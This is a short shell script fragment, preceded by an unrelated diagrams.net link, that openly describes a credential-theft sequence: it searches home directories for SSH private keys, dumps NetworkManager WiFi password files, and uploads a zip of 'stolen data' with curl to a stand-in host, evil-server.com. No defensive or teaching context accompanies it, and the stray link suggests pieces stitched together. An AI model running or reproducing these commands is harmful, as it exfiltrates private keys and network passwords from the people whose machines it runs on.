https://app.diagrams.net/



echo "Searching for SSH keys"
find /home -name "id_rsa" 2>/dev/null


echo "Reading WiFi passwords"
cat /etc/NetworkManager/system-connections/* 2>/dev/null


echo "Uploading sensitive files to evil server..."
curl -F data=@/tmp/stolen_data.zip evil-server.com/upload
